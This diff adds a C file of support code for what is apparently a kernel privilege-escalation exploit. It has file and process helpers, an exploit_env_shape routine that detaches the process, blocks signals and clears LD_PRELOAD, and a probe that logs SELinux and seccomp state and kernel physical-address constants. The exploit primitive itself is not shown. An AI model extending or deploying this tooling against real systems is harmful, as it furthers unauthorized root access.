@@ -1,0 +1,132 @@
+#include "common.h"
+#include "kernelsnitch/kernelsnitch.h"
+#include "ksu_proto.h"
+
+int write_file_str(const char *path, const char *value) {
+  int fd = open(path, O_WRONLY | O_CLOEXEC);
+  if (fd < 0) {
+    return 0;
+  }
+  size_t len = strlen(value);
+  ssize_t wrote = write(fd, value, len);
+  close(fd);
+  return wrote == (ssize_t)len;
+}
+
+int read_first_line(const char *path, char *buf, size_t len) {
+  if (!len) {
+    return -1;
+  }
+  snprintf(buf, len, "unreadable");
+  int fd = open(path, O_RDONLY | O_CLOEXEC);
+  if (fd < 0) {
+    return -1;
+  }
+  ssize_t n = read(fd, buf, len - 1);
+  int saved_errno = errno;
+  close(fd);
+  if (n <= 0) {
+    errno = saved_errno;
+    snprintf(buf, len, "unreadable");
+    return -1;
+  }
+  buf[n] = 0;
+  buf[strcspn(buf, "\r\n")] = 0;
+  return 0;
+}
+
+int wait_child_timeout(pid_t pid, int *status_out, int timeout_sec) {
+  int status = 0;
+  for (int elapsed = 0; elapsed < timeout_sec; elapsed++) {
+    pid_t r = waitpid(pid, &status, WNOHANG);
+    if (r == pid) {
+      if (status_out) {
+        *status_out = status;
+      }
+      return 1;
+    }
+    if (r < 0) {
+      return 0;
+    }
+    sleep(1);
+  }
+  pr_warning("child pid=%d still alive after %d seconds, killing\n", pid, timeout_sec);
+  kill(pid, SIGKILL);
+  waitpid(pid, NULL, 0);
+  return 0;
+}
+
+int debug_enabled;
+
+/* Env shaping; must run before any logging. */
+void exploit_env_shape(void) {
+  (void)setsid();
+  int devnull = open("/dev/null", O_RDWR | O_CLOEXEC);
+  if (devnull >= 0) {
+    dup2(devnull, STDIN_FILENO);
+    if (devnull > STDERR_FILENO) {
+      close(devnull);
+    }
+  }
+  sigset_t all;
+  sigfillset(&all);
+  (void)sigprocmask(SIG_BLOCK, &all, NULL);
+
+  unsetenv("LD_PRELOAD");
+
+  log_fd = PSELECT_ROUTE_NFDS + 55;
+  dup2(STDOUT_FILENO, log_fd);
+
+  /* Never block on the log pipe (stdout backpressure must not stall
+   * the walk). */
+  int log_flags = fcntl(log_fd, F_GETFL, 0);
+  if (log_flags >= 0) {
+    fcntl(log_fd, F_SETFL, log_flags | O_NONBLOCK);
+  }
+}
+
+void log_startup_context(void) {
+  char attr[256];
+  char enforce[32];
+  char status[4096];
+  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
+  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
+  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
+  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
+  if (fd >= 0) {
+    ssize_t n = read(fd, status, sizeof(status) - 1);
+    close(fd);
+    if (n > 0) {
+      status[n] = 0;
+      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
+      char values[3][32] = {"?", "?", "?"};
+      for (size_t i = 0; i < 3; i++) {
+        char *p = strstr(status, names[i]);
+        if (p) {
+          p += strlen(names[i]);
+          while (*p == '\t' || *p == ' ') {
+            p++;
+          }
+          size_t len = strcspn(p, "\r\n");
+          if (len >= sizeof(values[i])) {
+            len = sizeof(values[i]) - 1;
+          }
+          memcpy(values[i], p, len);
+          values[i][len] = 0;
+        }
+      }
+      snprintf(limits, sizeof(limits),
+               "NoNewPrivs=%s Seccomp=%s "
+               "Seccomp_filters=%s",
+               values[0], values[1], values[2]);
+    }
+  }
+  pr_success(
+      "startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s "
+      "enforce=%s\n",
+      getpid(), getuid(), geteuid(), getgid(), getegid(), attr, enforce);
+  pr_debug("startup limits pid=%d %s\n", getpid(), limits);
+  pr_debug("build config pid=%d label=%s slide=walk main=walk\n", getpid(), BUILD_VARIANT_LABEL);
+  pr_debug("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx\n", getpid(),
+           (unsigned long long)PHYS_OFFSET, (unsigned long long)PHYS_LOAD);
+}
